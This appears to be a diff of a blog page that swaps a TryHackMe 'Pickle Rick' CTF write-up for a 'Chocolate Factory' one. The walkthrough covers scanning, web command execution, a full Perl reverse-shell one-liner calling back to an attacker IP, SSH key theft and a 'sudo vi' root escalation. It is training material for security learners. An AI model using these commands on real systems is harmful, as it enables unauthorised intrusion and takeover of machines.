@@ -10,9 +10,9 @@
 
 <!-- Twitter And Open Graph Meta -->
 <!-- Open Graph Meta Tags -->
-<meta property="og:title" content="TryHackMe - Pickle Rick">
+<meta property="og:title" content="TryHackMe Chocolate Factory">
 <meta property="og:type" content="Article">
-<meta property="og:url" content="http://localhost:4000/tryhackme-pickle-rick/">
+<meta property="og:url" content="http://localhost:4000/tryhackme-chocolate-factory/">
 <meta name="image" property="og:image" content="/assets/img/avatar.jpg">
 <meta property="og:image:alt" content="">
 <meta property="og:site_name" content="Mr0Wido's Blog">
@@ -21,7 +21,7 @@
 <!-- Twitter Meta Tags -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:site" content="@">
-<meta name="twitter:title" content="TryHackMe - Pickle Rick">
+<meta name="twitter:title" content="TryHackMe Chocolate Factory">
 <meta name="twitter:image" content="/assets/img/avatar.jpg">
 
 
@@ -30,12 +30,12 @@
 <link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-<link rel="canonical" href="/tryhackme-pickle-rick/">
+<link rel="canonical" href="/tryhackme-chocolate-factory/">
 <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
 
 
 
-<title>TryHackMe - Pickle Rick - Mr0Wido's Blog</title>
+<title>TryHackMe Chocolate Factory - Mr0Wido's Blog</title>
 
 
 
@@ -50,7 +50,7 @@
 
 
 
-    <title>TryHackMe - Pickle Rick - Mr0Wido's Blog</title>
+    <title>TryHackMe Chocolate Factory - Mr0Wido's Blog</title>
     <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
     
   
@@ -139,156 +139,197 @@
       <div class="content-container">
         <main class="default">
           <div class="post">
-  <h1 class="post__title">TryHackMe - Pickle Rick</h1>
+  <h1 class="post__title">TryHackMe Chocolate Factory</h1>
   <div class="post__content">
-    <p>This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. 
-Deploy the virtual machine on this task and explore the web application: “http://target-ip/”</p>
+    <p>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!</p>
 
 <p><br></p>
 
-<h3 id="1-what-is-the-first-ingredient-rick-needs">1. What is the first ingredient Rick needs?</h3>
+<h2 id="1-introduction">1. Introduction</h2>
 
-<p>First, we run a <strong><code class="language-plaintext highlighter-rouge">nmap</code></strong> scan as usual.</p>
+<p>Welcome to Willy Wonka’s Chocolate Factory!</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.125.149
-</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg" alt="golden-ticket"></p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/nmap.png" alt="nmap"></p>
+<p>This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa</p>
 
-<p>As you can see there are 2 ports running.</p>
+<p>This is a beginner friendly room!</p>
 
-<p>Let’s visit the website and see what we can find.
-On the homepage, we see such an article.</p>
+<p>If you have any issues / queries you can reach us through Discord or Twitter.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/home.png" alt="home"></p>
-
-<p>In summary, Rick needs 3 ingredients to get back to his old self. The names of these ingredients are located inside the target machine. First of all, we need to find rick’s password and username and login into the target.</p>
-
-<p>Now let’s do a <strong><code class="language-plaintext highlighter-rouge">gobuster</code></strong> scan and see if we can find anything.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.125.149/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/gobuster.png" alt="gobuster"></p>
-
-<p>Nothing came out.</p>
-
-<p>Let’s do a <strong><code class="language-plaintext highlighter-rouge">nikto</code></strong> scan and see if we can find anything there.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nikto -h http://10.10.125.149/
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/nikto.png" alt="nikto"></p>
-
-<p>Yes, we found something important here. <strong><code class="language-plaintext highlighter-rouge">login.php</code></strong> is most likely the place where we should log in.</p>
-
-<p>We return to the homepage. We will take a look at the source codes of the pages.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/source.png" alt="source"></p>
-
-<p>Yes, we found Rick’s username. 
-<strong><code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>
-
-<p>I checked the source code of the login page, but nothing came up.</p>
-
-<p>We check what is there in robots.txt, which is one of the classic control points. And we find an article I’m not sure about, but this article may be the password.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/robot.png" alt="robot"></p>
-
-<p>I go back to the login page and try username and password.</p>
-
-<p><strong>Username: <code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>
-
-<p><strong>Password: <code class="language-plaintext highlighter-rouge">************</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/login.png" alt="login"></p>
-
-<p>And we are inside.
-A command panel appears directly in front of us.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/whoami.png" alt="whoami"></p>
-
-<p>Let’s take a look at the /home directory, who are our users?</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/whois.png" alt="whois"></p>
-
-<p>I’m looking to see what’s in the directory we’re in. <strong><code class="language-plaintext highlighter-rouge">ls -la</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/ls.png" alt="ls"></p>
-
-<p>And it looks like there are important files here.</p>
-
-<p>First, let’s take a look at what’s inside the clue.txt. <strong><code class="language-plaintext highlighter-rouge">cat clue.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/cat.png" alt="cat"></p>
-
-<p>The cat command is blocked. We can use less instead. Let’s do it. <strong><code class="language-plaintext highlighter-rouge">less clue.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/less.png" alt="less"></p>
-
-<p><em>clue.txt: Look around the file system for the other ingredient.</em></p>
-
-<p>Yes the less command worked.</p>
-
-<p>Now we can look at our first ingredient. <strong><code class="language-plaintext highlighter-rouge">less Sup3rS3cretPickl3Ingred.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/first.png" alt="first"></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">**********</code></strong></p>
+<p>( Created by AndyInfosec team for the community! )</p>
 
 <p><br></p>
 
-<h3 id="2-whats-the-second-ingredient-rick-needs">2. Whats the second ingredient Rick needs?</h3>
+<h2 id="2-challenges">2. Challenges</h2>
 
-<p>You remember the rick directory in /home from the previous question. Most likely the second ingredient is here and the third is in the root directory.
-I tried going to the/rick directory but it didn’t work so I can’t change the directory from the command panel. To solve this, we can run a reverse shell on the system and enter the target machine directly.</p>
+<p><br></p>
 
-<p>First I set up a netcat listener on my own machine.</p>
+<h3 id="21-enter-the-key-you-found">2.1 Enter the key you found!</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/nmap.png" alt="nmap"></p>
+
+<p>A lot of ports are open.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/home.png" alt="home"></p>
+
+<p>I see a login page. Let’s do a gobuster scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gobuster.png" alt="gobuster"></p>
+
+<p>We found a few php files. First, let’s look at <code class="language-plaintext highlighter-rouge">home.php</code>.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/php.png" alt="php"></p>
+
+<p>We can run commands on this page. Let’s connect with burp suite. Capture the page and send it to the repeater.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ls.png" alt="ls"></p>
+
+<p>Let’s look at the files in the directory in order, of what we will find.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">index.php.bak</code></strong></em></p>
+
+    <p>I don’t see anything significant here.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/bak.png" alt="bak"></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">key_rev_key</code></strong></em></p>
+
+    <p>This file is probably a script because the cat command doesn’t work.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key-rev-key.png" alt="key-rev-key"></p>
+
+    <p>Let’s back to the website and download the key-rev-key file. <a href="http://10.10.153.7/key_rev_key">http://10.10.153.7/key_rev_key</a></p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/cat.png" alt="cat"></p>
+
+    <p>Let’s try.</p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code> $ chmod +x key_rev_key
+ $ ./key_rev_key 
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/try.png" alt="try"></p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code> $ strings key_rev_key
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/strings.png" alt="strings"></p>
+
+    <p>Let’s try the name <code class="language-plaintext highlighter-rouge">laksdhfas</code>.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key.png" alt="key"></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">validate.php</code></strong></em></p>
+
+    <p>We found the username and password for the website.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/validate.png" alt="validate"></p>
+  </li>
+</ul>
+
+<p><br></p>
+
+<h3 id="22-what-is-charlies-password">2.2 What is Charlie’s password?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: c*****</code></strong></p>
+
+<p><br></p>
+
+<h3 id="23-change-user-to-charlie">2.3 Change user to charlie</h3>
+
+<p>Now, we can execute a reverse-shell command on home.php. First, let’s go to the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey’s cheat sheet</a>. You can try all of them.</p>
+
+<p>Perl, python, and netcat are working.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/shell.png" alt="shell"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<p>First, let’s setup a netcat listener.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
 </code></pre></div></div>
-<p>I go to the pentest monkey cheat sheet <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.
-And I’m trying the codes on the page. Those two are working.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/shell.png" alt="shell"></p>
+<p>After copying and pasting.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/reverse.png" alt="reverse"></p>
+
+<p>We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/inside-first.png" alt="inside-first"></p>
+
+<p>Now, we can change the user to charlie.</p>
+
+<p>We found a RSA key in charlie’s directory</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/charlie/teleport
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/rsa.png" alt="rsa"></p>
+
+<p>Let’s connect to charlie ssh.</p>
+
+<p>First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa
+$ ssh -i id_rsa charlie@10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ssh.png" alt="ssh"></p>
 
 <p>And we are inside.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/nc.png" alt="nc"></p>
+<p><br></p>
 
-<p>Now we can go to the rick directory.</p>
+<h3 id="24-enter-the-user-flag">2.4 Enter the user flag</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/rick
-$ cat second\ ingredients
-</code></pre></div></div>
+<p>Now, let’s get the user flag.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/second.png" alt="second"></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">*************</code></strong></p>
+<p><img src="/assets/img/tryhackme/chocolate-factory/user-flag.png" alt="user-flag"></p>
 
 <p><br></p>
 
-<h3 id="3-whats-the-final-ingredient-rick-needs">3. Whats the final ingredient Rick needs?</h3>
+<h3 id="25-enter-the-root-flag">2.5 Enter the root flag</h3>
 
-<p>For the third ingredient, we need to get root privileges.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/privesc.png" alt="privesc"></p>
-
-<p>No password is set for root.</p>
+<p>Now, we checking the sudo privileges.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
-$ sudo bash
 </code></pre></div></div>
 
-<p>Now we can reach the third ingredient and save rick.</p>
+<p><img src="/assets/img/tryhackme/chocolate-factory/sudo-l.png" alt="sudo-l"></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /root
-$ cat /root/3rd.txt
+<p>We can get root privileges using vi. I’m going to <a href="https://gtfobins.github.io/gtfobins/vi/">gtfobins</a> and see what I can do with vi.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gtfobins.png" alt="gtfobins"></p>
+
+<p>Now, we can root privilege using this command.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/null
 </code></pre></div></div>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/3rd.png" alt="3rd"></p>
+<p><img src="/assets/img/tryhackme/chocolate-factory/privesc.png" alt="privesc"></p>
 
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">**********</code></strong></p>
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/root-flag.png" alt="root-flag"></p>
 
 <p><br></p>
 
@@ -299,7 +340,7 @@ $ cat /root/3rd.txt
   </div>
   <div class="post__footer">
     <p class="post__date">
-      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 15, 2023</p>
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 29, 2023</p>
     <div class="post__categories">
       
       
@@ -312,11 +353,7 @@ $ cat /root/3rd.txt
         <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
         <span class="post__tags-container">
           
-          <span class="post__tags-item">ctf,</span>
-          
-          <span class="post__tags-item">gobuster,</span>
-          
-          <span class="post__tags-item">linux</span>
+          <span class="post__tags-item">ctf, privesc, stego</span>
           
         </span>
       </p>
@@ -326,12 +363,12 @@ $ cat /root/3rd.txt
 </div>
 <br>
 <!-- Twitter Share Button -->
-<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Pickle%20Rick&url=http://localhost:4000/tryhackme-pickle-rick/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
+<a href="https://twitter.com/intent/tweet?text=TryHackMe%20Chocolate%20Factory&url=http://localhost:4000/tryhackme-chocolate-factory/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
     Tweet
 </a>
   
 <!-- LinkedIn Share Button -->
-<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-pickle-rick/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
+<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-chocolate-factory/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
     LinkedIn
 </a>
   
@@ -343,8 +380,8 @@ $ cat /root/3rd.txt
 <div id="disqus_thread"></div>
 <script>
     var disqus_config = function () {
-    this.page.url = 'http://localhost:4000/tryhackme-pickle-rick/';
-    this.page.identifier = '/tryhackme-pickle-rick';
+    this.page.url = 'http://localhost:4000/tryhackme-chocolate-factory/';
+    this.page.identifier = '/tryhackme-chocolate-factory';
     
     };
 
@@ -694,156 +731,197 @@ $ cat /root/3rd.txt
       <div class="content-container">
         <main class="default">
           <div class="post">
-  <h1 class="post__title">TryHackMe - Pickle Rick</h1>
+  <h1 class="post__title">TryHackMe Chocolate Factory</h1>
   <div class="post__content">
-    <p>This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. 
-Deploy the virtual machine on this task and explore the web application: “http://target-ip/”</p>
+    <p>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!</p>
 
 <p><br></p>
 
-<h3 id="1-what-is-the-first-ingredient-rick-needs">1. What is the first ingredient Rick needs?</h3>
+<h2 id="1-introduction">1. Introduction</h2>
 
-<p>First, we run a <strong><code class="language-plaintext highlighter-rouge">nmap</code></strong> scan as usual.</p>
+<p>Welcome to Willy Wonka’s Chocolate Factory!</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.125.149
-</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg" alt="golden-ticket"></p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/nmap.png" alt="nmap"></p>
+<p>This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa</p>
 
-<p>As you can see there are 2 ports running.</p>
+<p>This is a beginner friendly room!</p>
 
-<p>Let’s visit the website and see what we can find.
-On the homepage, we see such an article.</p>
+<p>If you have any issues / queries you can reach us through Discord or Twitter.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/home.png" alt="home"></p>
-
-<p>In summary, Rick needs 3 ingredients to get back to his old self. The names of these ingredients are located inside the target machine. First of all, we need to find rick’s password and username and login into the target.</p>
-
-<p>Now let’s do a <strong><code class="language-plaintext highlighter-rouge">gobuster</code></strong> scan and see if we can find anything.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.125.149/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/gobuster.png" alt="gobuster"></p>
-
-<p>Nothing came out.</p>
-
-<p>Let’s do a <strong><code class="language-plaintext highlighter-rouge">nikto</code></strong> scan and see if we can find anything there.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nikto -h http://10.10.125.149/
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/nikto.png" alt="nikto"></p>
-
-<p>Yes, we found something important here. <strong><code class="language-plaintext highlighter-rouge">login.php</code></strong> is most likely the place where we should log in.</p>
-
-<p>We return to the homepage. We will take a look at the source codes of the pages.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/source.png" alt="source"></p>
-
-<p>Yes, we found Rick’s username. 
-<strong><code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>
-
-<p>I checked the source code of the login page, but nothing came up.</p>
-
-<p>We check what is there in robots.txt, which is one of the classic control points. And we find an article I’m not sure about, but this article may be the password.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/robot.png" alt="robot"></p>
-
-<p>I go back to the login page and try username and password.</p>
-
-<p><strong>Username: <code class="language-plaintext highlighter-rouge">R1ckRul3s</code></strong></p>
-
-<p><strong>Password: <code class="language-plaintext highlighter-rouge">************</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/login.png" alt="login"></p>
-
-<p>And we are inside.
-A command panel appears directly in front of us.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/whoami.png" alt="whoami"></p>
-
-<p>Let’s take a look at the /home directory, who are our users?</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/whois.png" alt="whois"></p>
-
-<p>I’m looking to see what’s in the directory we’re in. <strong><code class="language-plaintext highlighter-rouge">ls -la</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/ls.png" alt="ls"></p>
-
-<p>And it looks like there are important files here.</p>
-
-<p>First, let’s take a look at what’s inside the clue.txt. <strong><code class="language-plaintext highlighter-rouge">cat clue.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/cat.png" alt="cat"></p>
-
-<p>The cat command is blocked. We can use less instead. Let’s do it. <strong><code class="language-plaintext highlighter-rouge">less clue.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/less.png" alt="less"></p>
-
-<p><em>clue.txt: Look around the file system for the other ingredient.</em></p>
-
-<p>Yes the less command worked.</p>
-
-<p>Now we can look at our first ingredient. <strong><code class="language-plaintext highlighter-rouge">less Sup3rS3cretPickl3Ingred.txt</code></strong></p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/first.png" alt="first"></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">**********</code></strong></p>
+<p>( Created by AndyInfosec team for the community! )</p>
 
 <p><br></p>
 
-<h3 id="2-whats-the-second-ingredient-rick-needs">2. Whats the second ingredient Rick needs?</h3>
+<h2 id="2-challenges">2. Challenges</h2>
 
-<p>You remember the rick directory in /home from the previous question. Most likely the second ingredient is here and the third is in the root directory.
-I tried going to the/rick directory but it didn’t work so I can’t change the directory from the command panel. To solve this, we can run a reverse shell on the system and enter the target machine directly.</p>
+<p><br></p>
 
-<p>First I set up a netcat listener on my own machine.</p>
+<h3 id="21-enter-the-key-you-found">2.1 Enter the key you found!</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/nmap.png" alt="nmap"></p>
+
+<p>A lot of ports are open.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/home.png" alt="home"></p>
+
+<p>I see a login page. Let’s do a gobuster scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gobuster.png" alt="gobuster"></p>
+
+<p>We found a few php files. First, let’s look at <code class="language-plaintext highlighter-rouge">home.php</code>.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/php.png" alt="php"></p>
+
+<p>We can run commands on this page. Let’s connect with burp suite. Capture the page and send it to the repeater.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ls.png" alt="ls"></p>
+
+<p>Let’s look at the files in the directory in order, of what we will find.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">index.php.bak</code></strong></em></p>
+
+    <p>I don’t see anything significant here.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/bak.png" alt="bak"></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">key_rev_key</code></strong></em></p>
+
+    <p>This file is probably a script because the cat command doesn’t work.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key-rev-key.png" alt="key-rev-key"></p>
+
+    <p>Let’s back to the website and download the key-rev-key file. <a href="http://10.10.153.7/key_rev_key">http://10.10.153.7/key_rev_key</a></p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/cat.png" alt="cat"></p>
+
+    <p>Let’s try.</p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code> $ chmod +x key_rev_key
+ $ ./key_rev_key 
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/try.png" alt="try"></p>
+
+    <div class="language-plaintext highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code> $ strings key_rev_key
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/strings.png" alt="strings"></p>
+
+    <p>Let’s try the name <code class="language-plaintext highlighter-rouge">laksdhfas</code>.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key.png" alt="key"></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">validate.php</code></strong></em></p>
+
+    <p>We found the username and password for the website.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/validate.png" alt="validate"></p>
+  </li>
+</ul>
+
+<p><br></p>
+
+<h3 id="22-what-is-charlies-password">2.2 What is Charlie’s password?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: c*****</code></strong></p>
+
+<p><br></p>
+
+<h3 id="23-change-user-to-charlie">2.3 Change user to charlie</h3>
+
+<p>Now, we can execute a reverse-shell command on home.php. First, let’s go to the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey’s cheat sheet</a>. You can try all of them.</p>
+
+<p>Perl, python, and netcat are working.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/shell.png" alt="shell"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<p>First, let’s setup a netcat listener.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
 </code></pre></div></div>
-<p>I go to the pentest monkey cheat sheet <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.
-And I’m trying the codes on the page. Those two are working.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/shell.png" alt="shell"></p>
+<p>After copying and pasting.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/reverse.png" alt="reverse"></p>
+
+<p>We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/inside-first.png" alt="inside-first"></p>
+
+<p>Now, we can change the user to charlie.</p>
+
+<p>We found a RSA key in charlie’s directory</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/charlie/teleport
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/rsa.png" alt="rsa"></p>
+
+<p>Let’s connect to charlie ssh.</p>
+
+<p>First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa
+$ ssh -i id_rsa charlie@10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ssh.png" alt="ssh"></p>
 
 <p>And we are inside.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/nc.png" alt="nc"></p>
+<p><br></p>
 
-<p>Now we can go to the rick directory.</p>
+<h3 id="24-enter-the-user-flag">2.4 Enter the user flag</h3>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /home/rick
-$ cat second\ ingredients
-</code></pre></div></div>
+<p>Now, let’s get the user flag.</p>
 
-<p><img src="/assets/img/tryhackme/pickle_rick/second.png" alt="second"></p>
-
-<p><strong>Answer : <code class="language-plaintext highlighter-rouge">*************</code></strong></p>
+<p><img src="/assets/img/tryhackme/chocolate-factory/user-flag.png" alt="user-flag"></p>
 
 <p><br></p>
 
-<h3 id="3-whats-the-final-ingredient-rick-needs">3. Whats the final ingredient Rick needs?</h3>
+<h3 id="25-enter-the-root-flag">2.5 Enter the root flag</h3>
 
-<p>For the third ingredient, we need to get root privileges.</p>
-
-<p><img src="/assets/img/tryhackme/pickle_rick/privesc.png" alt="privesc"></p>
-
-<p>No password is set for root.</p>
+<p>Now, we checking the sudo privileges.</p>
 
